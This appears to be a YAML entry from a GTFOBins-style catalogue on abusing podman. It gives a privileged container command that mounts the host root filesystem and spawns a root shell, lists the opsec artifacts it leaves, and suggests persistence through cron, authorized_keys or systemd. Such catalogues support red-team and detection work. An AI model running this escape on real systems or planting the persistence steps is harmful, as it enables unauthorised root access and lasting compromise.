---
name: podman
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
  notes: This requires an actual image to be available (e.g., `alpine`) downloading it if not present.
references:
- https://gtfobins.github.io/gtfobins/podman/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
